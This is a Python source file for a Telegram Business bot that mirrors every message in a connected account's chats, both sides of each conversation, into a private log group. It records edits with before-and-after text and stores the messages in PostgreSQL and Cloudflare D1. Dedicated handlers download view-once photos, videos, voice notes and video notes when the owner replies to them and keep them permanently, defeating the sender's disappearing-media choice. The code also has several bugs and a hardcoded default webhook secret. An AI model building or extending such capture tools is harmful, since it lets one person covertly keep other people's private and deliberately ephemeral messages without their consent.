# ================== IMPORTS ==================

import os
import logging
import asyncpg

from fastapi import FastAPI, Request
from aiogram import Bot, Dispatcher
from aiogram.types import Update, InlineKeyboardMarkup, InlineKeyboardButton


# ================== SETTINGS ==================

BOT_TOKEN = os.getenv("BOT_TOKEN")
WEBHOOK_SECRET = os.getenv("WEBHOOK_SECRET", "lastmod-secret")
DATABASE_URL = os.getenv("DATABASE_URL")

CLOUDFLARE_API_TOKEN = os.getenv("CLOUDFLARE_API_TOKEN")
CLOUDFLARE_ACCOUNT_ID = os.getenv("CLOUDFLARE_ACCOUNT_ID")
D1_DATABASE_ID = os.getenv("D1_DATABASE_ID")

# ================== LOGGING ==================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s",
)

logger = logging.getLogger(__name__)


# ================== BOT ==================

if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN is not configured")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# ================== FASTAPI ==================

app = FastAPI()


# ================== MESSAGE STORAGE ==================

message_history = {}

# Связь Business-подключения с топиком в LOG-группе
business_topics = {}


# ================== DATABASE ==================

db_pool = None


async def init_db():
    global db_pool

    if not DATABASE_URL:
        raise RuntimeError("DATABASE_URL is not configured")

    db_pool = await asyncpg.create_pool(DATABASE_URL)

    async with db_pool.acquire() as conn:
        await conn.execute("""
            CREATE TABLE IF NOT EXISTS business_accounts (
                telegram_user_id BIGINT PRIMARY KEY,
                business_connection_id TEXT UNIQUE NOT NULL,
                topic_id BIGINT NOT NULL,
                first_name TEXT,
                last_name TEXT,
                username TEXT,
                created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
                updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
            )
        """)

    logger.info("DATABASE INITIALIZED")
    

# ================== CLOUDFLARE D1 ==================

import httpx


async def d1_query(sql: str, params=None):
    if not CLOUDFLARE_API_TOKEN:
        raise RuntimeError("CLOUDFLARE_API_TOKEN is not configured")

    if not CLOUDFLARE_ACCOUNT_ID:
        raise RuntimeError("CLOUDFLARE_ACCOUNT_ID is not configured")

    if not D1_DATABASE_ID:
        raise RuntimeError("D1_DATABASE_ID is not configured")

    url = (
        f"https://api.cloudflare.com/client/v4/accounts/"
        f"{CLOUDFLARE_ACCOUNT_ID}/d1/database/"
        f"{D1_DATABASE_ID}/query"
    )

    headers = {
        "Authorization": f"Bearer {CLOUDFLARE_API_TOKEN}",
        "Content-Type": "application/json",
    }

    payload = {
        "sql": sql,
        "params": params or [],
    }

    async with httpx.AsyncClient() as client:
        response = await client.post(
            url,
            headers=headers,
            json=payload,
            timeout=30,
        )

    if response.status_code != 200:
        raise RuntimeError(
            f"D1 API ERROR {response.status_code}: {response.text}"
        )

    data = response.json()

    if not data.get("success"):
        raise RuntimeError(
            f"D1 QUERY ERROR: {data}"
        )

    return data


# ================== D1 TEST ==================

async def test_d1():
    try:
        result = await d1_query("SELECT 1 AS test")

        logger.info(
            "D1 CONNECTION SUCCESS | result=%s",
            result,
        )

    except Exception as e:
        logger.exception(
            "D1 CONNECTION ERROR | %s",
            e,
        )
    # ================== D1 MESSAGE BATCHING ==================

import asyncio
import json
import time

MESSAGE_BATCH_SIZE = 100
MESSAGE_BATCH_TIMEOUT = 90

d1_message_batches = {}
d1_batch_tasks = {}


async def flush_d1_batch(batch_key):
    batch = d1_message_batches.get(batch_key)

    if not batch:
        return

    business_connection_id, chat_id = batch_key

    messages = batch["messages"]

    batch_id = f"{business_connection_id}_{chat_id}_{int(time.time())}"

    messages_json = json.dumps(
        messages,
        ensure_ascii=False,
    )

    await d1_query(
        """
        INSERT INTO message_batches (
            business_connection_id,
            chat_id,
            batch_id,
            messages_json
        )
        VALUES (?, ?, ?, ?)
        """,
        [
            business_connection_id,
            chat_id,
            batch_id,
            messages_json,
        ],
    )

    logger.info(
        "D1 BATCH SAVED | connection=%s | chat=%s | messages=%s",
        business_connection_id,
        chat_id,
        len(messages),
    )

    d1_message_batches.pop(batch_key, None)

    task = d1_batch_tasks.pop(batch_key, None)

    if task and not task.done():
        task.cancel()


async def d1_batch_timeout(batch_key):
    await asyncio.sleep(MESSAGE_BATCH_TIMEOUT)

    if batch_key in d1_message_batches:
        try:
            await flush_d1_batch(batch_key)

        except Exception:
            logger.exception(
                "D1 BATCH TIMEOUT FLUSH ERROR | key=%s",
                batch_key,
            )


async def add_message_to_d1_batch(
    business_connection_id,
    chat_id,
    message_data,
):
    batch_key = (
        business_connection_id,
        chat_id,
    )

    if batch_key not in d1_message_batches:
        d1_message_batches[batch_key] = {
            "messages": [],
            "created_at": time.time(),
        }

        d1_batch_tasks[batch_key] = asyncio.create_task(
            d1_batch_timeout(batch_key)
        )

    d1_message_batches[batch_key]["messages"].append(
        message_data
    )

    batch_size = len(
        d1_message_batches[batch_key]["messages"]
    )

    logger.info(
        "D1 BATCH ADD | connection=%s | chat=%s | size=%s",
        business_connection_id,
        chat_id,
        batch_size,
    )

    if batch_size >= MESSAGE_BATCH_SIZE:
        await flush_d1_batch(batch_key)
        
        
# ================== LOG CHAT ID ==================

@dp.message()
async def detect_log_chat(message):
    logger.info(
        "LOG CHAT | chat_id=%s | title=%s | type=%s",
        message.chat.id,
        message.chat.title,
        message.chat.type,
    )

    if str(message.chat.id) == str(LOG_CHAT_ID):
        try:
            chat = await bot.get_chat(int(LOG_CHAT_ID))

            logger.info(
                "LOG CHAT CHECK | id=%s | type=%s | is_forum=%s | title=%s",
                chat.id,
                chat.type,
                getattr(chat, "is_forum", None),
                chat.title,
            )

            me = await bot.get_me()

            member = await bot.get_chat_member(
                chat_id=int(LOG_CHAT_ID),
                user_id=me.id,
            )

            logger.info(
                "BOT RIGHTS | status=%s | can_manage_topics=%s | can_delete_messages=%s | can_pin_messages=%s",
                member.status,
                getattr(member, "can_manage_topics", None),
                getattr(member, "can_delete_messages", None),
                getattr(member, "can_pin_messages", None),
            )

        except Exception as e:
            logger.exception(
                "BOT RIGHTS CHECK ERROR | %s",
                e,
            )
        
    # ================== CHECK LOG FORUM ==================

@dp.message()
async def check_log_forum(message):
    if str(message.chat.id) != str(LOG_CHAT_ID):
        return

    try:
        chat = await bot.get_chat(int(LOG_CHAT_ID))

        logger.info(
            "LOG CHAT CHECK | id=%s | type=%s | is_forum=%s | title=%s",
            chat.id,
            chat.type,
            getattr(chat, "is_forum", None),
            chat.title,
        )

    except Exception as e:
        logger.exception(
            "LOG CHAT CHECK ERROR | %s",
            e,
        )
    # ================== BUSINESS CONNECTIONS ==================

@dp.business_connection()
async def handle_business_connection(connection):
    business_connection_id = connection.id
    user = connection.user

    logger.info(
        "BUSINESS CONNECTION | id=%s | user_id=%s | name=%s %s",
        business_connection_id,
        user.id,
        user.first_name,
        user.last_name or "",
    )

    # ================== CHECK DATABASE ==================

    if db_pool is None:
        logger.error("DATABASE POOL IS NOT INITIALIZED")
        return

    async with db_pool.acquire() as conn:
        row = await conn.fetchrow(
            """
            SELECT topic_id
            FROM business_accounts
            WHERE telegram_user_id = $1
            """,
            user.id,
        )

    if row:
        topic_id = row["topic_id"]

        business_topics[business_connection_id] = topic_id

        logger.info(
            "BUSINESS CONNECTION TOPIC LOADED FROM DATABASE | "
            "user=%s | connection=%s | topic_id=%s",
            user.id,
            business_connection_id,
            topic_id,
        )

        return

    # Если пользователя ещё нет в базе —
    # новый топик создаст handle_business_message().
    logger.info(
        "BUSINESS CONNECTION NOT IN DATABASE | "
        "user=%s | connection=%s",
        user.id,
        business_connection_id,
    )
        
# ================== BUSINESS MESSAGES ==================

LOG_CHAT_ID = os.getenv("LOG_CHAT_ID")


@dp.business_message()
async def handle_business_message(message):
    logger.info(
        "MESSAGE DEBUG | message_id=%s | photo=%s | video=%s | "
        "reply=%s | reply_id=%s | reply_photo=%s | reply_video=%s | "
        "external_reply=%s | quote=%s",
        message.message_id,
        bool(message.photo),
        bool(message.video),
        bool(message.reply_to_message),
        message.reply_to_message.message_id
        if message.reply_to_message
        else None,
        bool(message.reply_to_message.photo)
        if message.reply_to_message
        else False,
        bool(message.reply_to_message.video)
        if message.reply_to_message
        else False,
        bool(message.external_reply),
        bool(message.quote),
    )

    key = (message.chat.id, message.message_id)

    text = message.text or message.caption or ""

    message_history[key] = {
        "text": text,
    }

    logger.info(
        "NEW MESSAGE | chat=%s | message=%s | text=%s",
        message.chat.id,
        message.message_id,
        text,
    )

   # ================== GET BUSINESS OWNER ==================

    business_connection = await bot.get_business_connection(
        business_connection_id=message.business_connection_id
    )

    user = business_connection.user


        # ================== GET OR CREATE USER TOPIC ==================

    topic_id = business_topics.get(message.business_connection_id)

    # Сначала ищем пользователя в PostgreSQL
    if topic_id is None:
        async with db_pool.acquire() as conn:
            row = await conn.fetchrow(
                """
                SELECT topic_id
                FROM business_accounts
                WHERE telegram_user_id = $1
                """,
                user.id,
            )

        if row:
            topic_id = row["topic_id"]

            business_topics[message.business_connection_id] = topic_id

            logger.info(
                "BUSINESS TOPIC LOADED FROM DATABASE | user=%s | topic_id=%s",
                user.id,
                topic_id,
            )

    # Если пользователя в базе ещё нет — создаём новый топик
    if topic_id is None:
        try:
            log_chat = await bot.get_chat(int(LOG_CHAT_ID))

            logger.info(
                "BEFORE CREATE TOPIC | chat_id=%s | type=%s | is_forum=%s",
                log_chat.id,
                log_chat.type,
                getattr(log_chat, "is_forum", None),
            )

            topic = await bot.create_forum_topic(
                chat_id=log_chat.id,
                name=f"👤 {user.first_name}",
            )

            topic_id = topic.message_thread_id

            business_topics[message.business_connection_id] = topic_id

            async with db_pool.acquire() as conn:
                await conn.execute(
                    """
                    INSERT INTO business_accounts (
                        telegram_user_id,
                        business_connection_id,
                        topic_id,
                        first_name,
                        last_name,
                        username
                    )
                    VALUES ($1, $2, $3, $4, $5, $6)
                    ON CONFLICT (telegram_user_id)
                    DO UPDATE SET
                        business_connection_id = EXCLUDED.business_connection_id,
                        topic_id = EXCLUDED.topic_id,
                        first_name = EXCLUDED.first_name,
                        last_name = EXCLUDED.last_name,
                        username = EXCLUDED.username,
                        updated_at = NOW()
                    """,
                    user.id,
                    message.business_connection_id,
                    topic_id,
                    user.first_name,
                    user.last_name,
                    user.username,
                )

            logger.info(
                "BUSINESS TOPIC CREATED AND SAVED | connection=%s | topic_id=%s | user=%s",
                message.business_connection_id,
                topic_id,
                user.id,
            )

        except Exception as e:
            logger.exception(
                "BUSINESS TOPIC CREATE ERROR | connection=%s | chat_id=%s | error=%s",
                message.business_connection_id,
                LOG_CHAT_ID,
                e,
            )
            return

    # ================== SAVE MESSAGE TO USER TOPIC ==================

    try:
        info_text = (
            "📥 НОВОЕ СООБЩЕНИЕ\n\n"
            f"👤 {user.first_name} {user.last_name or ''}\n"
            f"🆔 User ID: {user.id}\n"
            f"🔑 Business connection: {message.business_connection_id}\n"
            f"💬 Chat ID: {message.chat.id}\n"
            f"🆔 Message ID: {message.message_id}\n"
        )

        # ================== PROFILE BUTTONS ==================

        sender_id = message.from_user.id

        if sender_id == user.id:
            recipient_id = message.chat.id
        else:
            recipient_id = user.id

        profile_keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [
                    InlineKeyboardButton(
                        text="👤 Отправитель",
                        url=f"tg://user?id={sender_id}",
                    ),
                    InlineKeyboardButton(
                        text="📨 Получатель",
                        url=f"tg://user?id={recipient_id}",
                    ),
                ]
            ]
        )
        
        
        # ================== REPLY TO PHOTO ==================

        if message.reply_to_message and message.reply_to_message.photo:
            original = message.reply_to_message

            try:
                from io import BytesIO
                from aiogram.types import BufferedInputFile

                file_info = await bot.get_file(
                    original.photo[-1].file_id
                )

                logger.info(
                    "SELF-DESTRUCT PHOTO GET FILE | file_id=%s | file_path=%s",
                    original.photo[-1].file_id,
                    file_info.file_path,
                )

                photo_buffer = BytesIO()

                await bot.download_file(
                    file_info.file_path,
                    destination=photo_buffer,
                )

                photo_buffer.seek(0)

                photo_data = photo_buffer.read()

                logger.info(
                    "SELF-DESTRUCT PHOTO DOWNLOADED | size=%s",
                    len(photo_data),
                )

                photo_file = BufferedInputFile(
                    photo_data,
                    filename="self_destruct_photo.jpg",
                )

                await bot.send_photo(
                    chat_id=int(LOG_CHAT_ID),
                    message_thread_id=topic_id,
                    photo=photo_file,
                    caption=(
                        info_text
                        + "\n🖼 Фото"
                        + (
                            f"\n📝 Подпись:\n{original.caption}"
                            if original.caption
                            else ""
                        )
                    ),
                    reply_markup=profile_keyboard,
                )

                logger.info(
                    "SELF-DESTRUCT PHOTO SAVED | connection=%s | topic=%s | "
                    "original_message=%s | reply_message=%s",
                    message.business_connection_id,
                    topic_id,
                    original.message_id,
                    message.message_id,
                )

            except Exception as e:
                logger.exception(
                    "SELF-DESTRUCT PHOTO PROCESS ERROR: %s",
                    e,
                )

            if message.text:
                await bot.send_message(
                    chat_id=int(LOG_CHAT_ID),
                    message_thread_id=topic_id,
                    text=(
                        "💬 ОТВЕТ НА СООБЩЕНИЕ\n\n"
                        f"📝 {message.text}"
                    ),
                )

        # ================== REPLY TO VIDEO ==================

        elif message.reply_to_message and message.reply_to_message.video:
            original = message.reply_to_message

            try:
                from io import BytesIO
                from aiogram.types import BufferedInputFile

                file_info = await bot.get_file(
                    original.video.file_id
                )

                logger.info(
                    "SELF-DESTRUCT VIDEO GET FILE | file_id=%s | file_path=%s",
                    original.video.file_id,
                    file_info.file_path,
                )

                video_buffer = BytesIO()

                await bot.download_file(
                    file_info.file_path,
                    destination=video_buffer,
                )

                video_buffer.seek(0)

                video_data = video_buffer.read()

                logger.info(
                    "SELF-DESTRUCT VIDEO DOWNLOADED | size=%s",
                    len(video_data),
                )

                video_file = BufferedInputFile(
                    video_data,
                    filename="self_destruct_video.mp4",
                )

                await bot.send_video(
                    chat_id=int(LOG_CHAT_ID),
                    message_thread_id=topic_id,
                    video=video_file,
                    caption=(
                        info_text
                        + "\n🎥 Видео"
                        + (
                            f"\n📝 Подпись:\n{original.caption}"
                            if original.caption
                            else ""
                        )
                    ),
                    reply_markup=profile_keyboard,
                )

                logger.info(
                    "SELF-DESTRUCT VIDEO SAVED | connection=%s | topic=%s | "
                    "original_message=%s | reply_message=%s",
                    message.business_connection_id,
                    topic_id,
                    original.message_id,
                    message.message_id,
                )

            except Exception as e:
                logger.exception(
                    "SELF-DESTRUCT VIDEO PROCESS ERROR: %s",
                    e,
                )

            if message.text:
                await bot.send_message(
                    chat_id=int(LOG_CHAT_ID),
                    message_thread_id=topic_id,
                    text=(
                        "💬 ОТВЕТ НА СООБЩЕНИЕ\n\n"
                        f"📝 {message.text}"
                    ),
                )


        # ================== REPLY TO VOICE ==================

        elif message.reply_to_message and message.reply_to_message.voice:
            original = message.reply_to_message

            try:
                from io import BytesIO
                from aiogram.types import BufferedInputFile

                file_info = await bot.get_file(
                    original.voice.file_id
                )

                logger.info(
                    "SELF-DESTRUCT VOICE GET FILE | file_id=%s | file_path=%s",
                    original.voice.file_id,
                    file_info.file_path,
                )

                voice_buffer = BytesIO()

                await bot.download_file(
                    file_info.file_path,
                    destination=voice_buffer,
                )

                voice_buffer.seek(0)

                voice_data = voice_buffer.read()

                logger.info(
                    "SELF-DESTRUCT VOICE DOWNLOADED | size=%s",
                    len(voice_data),
                )

                voice_file = BufferedInputFile(
                    voice_data,
                    filename="self_destruct_voice.ogg",
                )

                await bot.send_voice(
                    chat_id=int(LOG_CHAT_ID),
                    message_thread_id=topic_id,
                    voice=voice_file,
                    caption=info_text + "\n🎤 Одноразовое голосовое сообщение",
                    reply_markup=profile_keyboard,
                )

                logger.info(
                    "SELF-DESTRUCT VOICE SAVED | connection=%s | topic=%s | "
                    "original_message=%s | reply_message=%s",
                    message.business_connection_id,
                    topic_id,
                    original.message_id,
                    message.message_id,
                )

            except Exception as e:
                logger.exception(
                    "SELF-DESTRUCT VOICE PROCESS ERROR: %s",
                    e,
                )

            if message.text:
                await bot.send_message(
                    chat_id=int(LOG_CHAT_ID),
                    message_thread_id=topic_id,
                    text=(
                        "💬 ОТВЕТ НА СООБЩЕНИЕ\n\n"
                        f"📝 {message.text}"
                    ),
                )


        # ================== REPLY TO VIDEO NOTE ==================

        elif message.reply_to_message and message.reply_to_message.video_note:
            original = message.reply_to_message

            try:
                from io import BytesIO
                from aiogram.types import BufferedInputFile

                file_info = await bot.get_file(
                    original.video_note.file_id
                )

                logger.info(
                    "SELF-DESTRUCT VIDEO NOTE GET FILE | file_id=%s | file_path=%s",
                    original.video_note.file_id,
                    file_info.file_path,
                )

                video_note_buffer = BytesIO()

                await bot.download_file(
                    file_info.file_path,
                    destination=video_note_buffer,
                )

                video_note_buffer.seek(0)

                video_note_data = video_note_buffer.read()

                logger.info(
                    "SELF-DESTRUCT VIDEO NOTE DOWNLOADED | size=%s",
                    len(video_note_data),
                )

                video_note_file = BufferedInputFile(
                    video_note_data,
                    filename="self_destruct_video_note.mp4",
                )

                await bot.send_video_note(
                    chat_id=int(LOG_CHAT_ID),
                    message_thread_id=topic_id,
                    video_note=video_note_file,
                )

                await bot.send_message(
                    chat_id=int(LOG_CHAT_ID),
                    message_thread_id=topic_id,
                    text=info_text + "\n⭕ Одноразовый кружок",
                    reply_markup=profile_keyboard,
                )

                logger.info(
                    "SELF-DESTRUCT VIDEO NOTE SAVED | connection=%s | topic=%s | "
                    "original_message=%s | reply_message=%s",
                    message.business_connection_id,
                    topic_id,
                    original.message_id,
                    message.message_id,
                )

            except Exception as e:
                logger.exception(
                    "SELF-DESTRUCT VIDEO NOTE PROCESS ERROR: %s",
                    e,
                )

            if message.text:
                await bot.send_message(
                    chat_id=int(LOG_CHAT_ID),
                    message_thread_id=topic_id,
                    text=(
                        "💬 ОТВЕТ НА СООБЩЕНИЕ\n\n"
                        f"📝 {message.text}"
                    ),
                )
                
                # ================== TEXT ==================

        elif message.text:
            sent_message = await bot.send_message(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                text=(
                    info_text
                    + f"\n📝 Текст:\n{message.text}"
                ),
                reply_markup=profile_keyboard,
            )

            message_history[
                (
                    message.business_connection_id,
                    message.chat.id,
                    message.message_id,
                )
            ] = {
                "text": message.text,
                "log_message_id": sent_message.message_id,
                "topic_id": topic_id,
            }

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "text",
                    "file_id": None,
                    "text_content": message.text,
                },
            )

                # ================== PHOTO ==================

        elif message.photo:
            sent_message = await bot.send_photo(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                photo=message.photo[-1].file_id,
                caption=(
                    info_text
                    + "\n🖼 Фото"
                    + (
                        f"\n📝 Подпись:\n{message.caption}"
                        if message.caption
                        else ""
                    )
                ),
                reply_markup=profile_keyboard,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "photo",
                    "file_id": message.photo[-1].file_id,
                    "text_content": message.caption,
                },
            )

               # ================== VIDEO ==================

        elif message.video:
            sent_message = await bot.send_video(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                video=message.video.file_id,
                caption=(
                    info_text
                    + "\n🎥 Видео"
                    + (
                        f"\n📝 Подпись:\n{message.caption}"
                        if message.caption
                        else ""
                    )
                ),
                reply_markup=profile_keyboard,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "video",
                    "file_id": message.video.file_id,
                    "text_content": message.caption,
                },
            )


# ================== AUDIO ==================

        elif message.audio:
            sent_message = await bot.send_audio(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                audio=message.audio.file_id,
                caption=(
                    info_text
                    + "\n🎵 Аудио"
                    + (
                        f"\n📝 Подпись:\n{message.caption}"
                        if message.caption
                        else ""
                    )
                ),
                reply_markup=profile_keyboard,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "audio",
                    "file_id": message.audio.file_id,
                    "text_content": message.caption,
                },
            )


# ================== VOICE ==================

        elif message.voice:
            sent_message = await bot.send_voice(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                voice=message.voice.file_id,
                caption=info_text + "\n🎤 Голосовое сообщение",
                reply_markup=profile_keyboard,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "voice",
                    "file_id": message.voice.file_id,
                    "text_content": None,
                },
            )


# ================== DOCUMENT ==================

        elif message.document:
            sent_message = await bot.send_document(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                document=message.document.file_id,
                caption=(
                    info_text
                    + "\n📎 Документ"
                    + (
                        f"\n📝 Подпись:\n{message.caption}"
                        if message.caption
                        else ""
                    )
                ),
                reply_markup=profile_keyboard,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "document",
                    "file_id": message.document.file_id,
                    "text_content": message.caption,
                },
            )


# ================== STICKER ==================

        elif message.sticker:
            sent_message = await bot.send_message(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                text=info_text + "\n😀 Стикер",
                reply_markup=profile_keyboard,
            )

            await bot.send_sticker(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                sticker=message.sticker.file_id,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "sticker",
                    "file_id": message.sticker.file_id,
                    "text_content": None,
                },
            )


# ================== ANIMATION / GIF ==================

        elif message.animation:
            sent_message = await bot.send_animation(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                animation=message.animation.file_id,
                caption=(
                    info_text
                    + "\n🎞 GIF / Анимация"
                    + (
                        f"\n📝 Подпись:\n{message.caption}"
                        if message.caption
                        else ""
                    )
                ),
                reply_markup=profile_keyboard,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "animation",
                    "file_id": message.animation.file_id,
                    "text_content": message.caption,
                },
            )


# ================== VIDEO NOTE / CIRCLE ==================

        elif message.video_note:
            sent_message = await bot.send_message(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                text=info_text + "\n📹 Видеосообщение",
                reply_markup=profile_keyboard,
            )

            await bot.send_video_note(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                video_note=message.video_note.file_id,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "video_note",
                    "file_id": message.video_note.file_id,
                    "text_content": None,
                },
            )


# ================== LOCATION ==================

        elif message.location:
            sent_message = await bot.send_message(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                text=info_text + "\n📍 Геолокация",
                reply_markup=profile_keyboard,
            )

            await bot.send_location(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                latitude=message.location.latitude,
                longitude=message.location.longitude,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "location",
                    "file_id": None,
                    "text_content": None,
                    "latitude": message.location.latitude,
                    "longitude": message.location.longitude,
                },
            )


# ================== CONTACT ==================

        elif message.contact:
            sent_message = await bot.send_message(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                text=info_text + "\n👤 Контакт",
                reply_markup=profile_keyboard,
            )

            await bot.send_contact(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                phone_number=message.contact.phone_number,
                first_name=message.contact.first_name,
                last_name=message.contact.last_name,
                vcard=message.contact.vcard,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "contact",
                    "file_id": None,
                    "text_content": None,
                    "phone_number": message.contact.phone_number,
                    "first_name": message.contact.first_name,
                    "last_name": message.contact.last_name,
                    "vcard": message.contact.vcard,
                },
            )


# ================== UNKNOWN MESSAGE ==================

        else:
            sent_message = await bot.send_message(
                chat_id=int(LOG_CHAT_ID),
                message_thread_id=topic_id,
                text=(
                    info_text
                    + "\n❓ Неподдерживаемый тип сообщения"
                ),
                reply_markup=profile_keyboard,
            )

            await add_message_to_d1_batch(
                business_connection_id=message.business_connection_id,
                chat_id=message.chat.id,
                message_data={
                    "message_id": message.message_id,
                    "log_message_id": sent_message.message_id,
                    "message_type": "unknown",
                    "file_id": None,
                    "text_content": None,
                },
            )

        logger.info(
            "LOG SAVED | connection=%s | topic=%s | original_message=%s",
            message.business_connection_id,
            topic_id,
            message.message_id,
        )

    except Exception as e:
        logger.exception("LOG SAVE ERROR: %s")
# ================== EDITED BUSINESS MESSAGES ==================

@dp.edited_business_message()
async def handle_edited_business_message(message):
    key = (
        message.business_connection_id,
        message.chat.id,
        message.message_id,
    )

    old_data = message_history.get(key)

    old_text = (
        old_data["text"]
        if old_data
        else "[старый текст не сохранён]"
    )

    new_text = message.text or message.caption or ""

    logger.info(
        "MESSAGE EDITED | chat=%s | message=%s\n"
        "BEFORE: %s\n"
        "AFTER: %s",
        message.chat.id,
        message.message_id,
        old_text,
        new_text,
    )

    # ================== GET EDITED MESSAGE TOPIC ==================

    topic_id = business_topics.get(message.business_connection_id)

    if topic_id is None and db_pool is not None:
        business_connection = await bot.get_business_connection(
            business_connection_id=message.business_connection_id
        )

        user = business_connection.user

        async with db_pool.acquire() as conn:
            row = await conn.fetchrow(
                """
                SELECT topic_id
                FROM business_accounts
                WHERE telegram_user_id = $1
                """,
                user.id,
            )

        if row:
            topic_id = row["topic_id"]
            business_topics[message.business_connection_id] = topic_id

    if topic_id is None:
        logger.error(
            "EDITED MESSAGE TOPIC NOT FOUND | connection=%s | chat=%s | message=%s",
            message.business_connection_id,
            message.chat.id,
            message.message_id,
        )
        return

    # ================== SAVE EDIT TO LOG ==================

    log_message_id = (
        old_data["log_message_id"]
        if old_data
        else None
    )

    await bot.send_message(
        chat_id=int(LOG_CHAT_ID),
        message_thread_id=topic_id,
        text=(
            "✏️ СООБЩЕНИЕ ИЗМЕНЕНО\n\n"
            f"🆔 Message ID: {message.message_id}\n\n"
            "⬅️ БЫЛО:\n"
            f"{old_text}\n\n"
            "➡️ СТАЛО:\n"
            f"{new_text}"
        ),
        reply_parameters=(
            {
                "message_id": log_message_id
            }
            if log_message_id
            else None
        ),
    )

    message_history[key] = {
        "text": new_text,
        "log_message_id": log_message_id,
        "topic_id": topic_id,
    }
    # ================== DELETED BUSINESS MESSAGES ==================

@dp.deleted_business_messages()
async def handle_deleted_business_messages(message):
    logger.info(
        "BUSINESS MESSAGES DELETED | connection=%s | chat=%s | messages=%s",
        message.business_connection_id,
        message.chat.id,
        message.message_ids,
    )
    
# ================== WEBHOOK ==================

@app.get("/")
async def root():
    return {
        "status": "online",
        "service": "LastMod Business Bot",
    }


@app.post("/webhook")
async def telegram_webhook(request: Request):
    secret = request.headers.get("X-Telegram-Bot-Api-Secret-Token")

    if secret != WEBHOOK_SECRET:
        return {"ok": False}

    data = await request.json()

    update = Update.model_validate(data)

    await dp.feed_update(bot, update)

    return {"ok": True}


# ================== STARTUP ==================

@app.on_event("startup")
async def startup():
    logger.info("STARTUP: BEFORE DATABASE")

    await init_db()
    await test_d1()

    logger.info("STARTUP: AFTER DATABASE")

    webhook_url = "https://kusuo-saiki.onrender.com/webhook"

    await bot.set_webhook(
        url=webhook_url,
        secret_token=WEBHOOK_SECRET,
    )

    logger.info("LastMod Business Bot started")
    logger.info("Webhook set: %s", webhook_url)

# ================== SHUTDOWN ==================

@app.on_event("shutdown")
async def shutdown():
    await bot.session.close()
    logger.info("LastMod Business Bot stopped")